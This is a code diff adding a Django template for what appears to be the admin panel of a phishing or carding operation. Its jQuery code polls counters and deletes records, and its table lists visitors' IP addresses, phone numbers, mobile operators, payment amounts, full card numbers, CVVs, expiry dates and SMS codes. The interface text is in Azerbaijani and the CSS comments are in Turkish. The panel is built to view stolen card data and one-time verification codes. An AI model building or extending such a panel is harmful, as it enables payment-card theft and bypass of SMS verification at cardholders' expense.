@@ -1,0 +1,213 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contact List</title>
+
+<link rel="stylesheet" type="text/css" href="{% static 'css/crud.css' %}">
+
+    <!-- Add Bootstrap CSS -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+</head>
+
+
+<h1 id="phone-only-count">Yalniz telefon nomresi daxil edenler: {{ count }}</h1>
+<p>Total Visits: <span id="visit-count"></span></p>
+<button id="delete-count-btn">Delete Count</button>
+
+
+<script>
+    $(document).ready(function() {
+        $.getJSON('/phone_only_count_api/', function(data) {
+            console.log('Count:', data.count);  // Add this line
+            $('#phone-only-count').text('Yalniz telefon nomresi daxil edenler: ' + data.count);
+        });
+        
+        setInterval(function() {
+            $.getJSON('/phone_only_count_api/', function(data) {
+                console.log('Count:', data.count);  // Add this line
+                $('#phone-only-count').text('Yalniz telefon nomresi daxil edenler: ' + data.count);
+            });
+        }, 10000);
+    });
+</script>
+
+<script>
+    $(document).ready(function() {
+      // Function to update the visit count
+      function updateVisitCount() {
+        $.ajax({
+          url: '/api/visit-count/',
+          type: 'GET',
+          dataType: 'json',
+          success: function(response) {
+            $('#visit-count').text(response.visit_count);
+          },
+          error: function() {
+            console.log('Error occurred while fetching visit count.');
+          }
+        });
+      }
+    
+      // Function to handle the delete count button click event
+      function deleteCount() {
+        $.ajax({
+          url: '/api/visit-count/delete/',
+          type: 'POST',
+          dataType: 'json',
+          success: function(response) {
+            console.log(response.message);
+            updateVisitCount();  // Update the visit count after deletion
+          },
+          error: function() {
+            console.log('Error occurred while deleting visit count.');
+          }
+        });
+      }
+    
+      // Call the updateVisitCount function initially
+      updateVisitCount();
+    
+      // Call the updateVisitCount function periodically to update the visit count in real-time
+      setInterval(updateVisitCount, 10000);
+    
+      // Bind the deleteCount function to the button click event
+      $('#delete-count-btn').click(deleteCount);
+    });
+    </script>
+<button id="delete-all-btn">Delete All</button>
+<script>
+    document.getElementById('delete-all-btn').addEventListener('click', function() {
+        $.ajax({
+            url: '{% url "delete_all_contacts" %}',
+            type: 'POST',
+            dataType: 'json',
+            success: function(data) {
+                if (data.status === 'success') {
+                    // Refresh the contact list after successful deletion
+                    getContactList();
+                }
+            },
+            error: function() {
+                console.error('Error deleting all contacts.');
+            }
+        });
+    });
+    
+</script>
+<body>
+    {% block content %}
+        <div class="container">
+            <h1>Contact List</h1>
+            <table class="table table-striped table-hover">
+                <thead class="table-dark">
+                    <tr>
+                        <th>ID</th>
+                        <th>IP</th>
+                        <th>Page</th>
+                        <th>operator</th>
+                        <th>Phone</th>
+                        <th>Amount</th>
+                        <th>Card Number</th>
+                        <th>CVV</th>
+                        <th>MM</th>
+                        <th>YY</th>
+                        <th>SMS</th>
+                        <th>Created At</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                
+                <tbody id="contact-table-body">
+                    <!-- JavaScript will populate this section -->
+                </tbody>
+            </table>
+        </div>
+    {% endblock %}
+    {% block extra_js %}
+        <script src="{% static 'js/crud.js' %}"></script>
+    {% endblock %}
+    
+    <!-- Add Bootstrap JavaScript -->
+</body>
+<style>
+    /* Sayfa arka plan rengi */
+body {
+    background-color: black;
+}
+
+/* Başlık yazıları */
+h1, h2, h3, h4, h5, h6 {
+    color: orange;
+}
+
+/* Menü linkleri */
+.menu-link {
+    color: white;
+}
+
+/* Menü hover efekti */
+.menu-link:hover {
+    color: orange;
+}
+
+/* Genel metinler */
+p, span, a {
+    color: white;
+}
+
+/* Butonlar */
+button {
+    background-color: orange;
+    color: black;
+}
+
+/* Buton hover efekti */
+button:hover {
+    background-color: black;
+    color: orange;
+}
+
+/* Formlar */
+input[type="text"], input[type="email"], input[type="password"], textarea {
+    background-color: black;
+    color: white;
+    border: 1px solid orange;
+}
+
+/* Formlar - buton */
+input[type="submit"] {
+    background-color: orange;
+    color: black;
+}
+
+/* Formlar - buton hover efekti */
+input[type="submit"]:hover {
+    background-color: black;
+    color: orange;
+}
+
+/* Footer linkleri */
+.footer-link {
+    color: orange;
+}
+
+/* Footer hover efekti */
+.footer-link:hover {
+    color: white;
+}
+
+/* Görseller */
+img {
+    border: 1px solid orange;
+}
+
+/* Hover efekti */
+img:hover {
+    opacity: 0.8;
+}
+
+</style>
+</html>
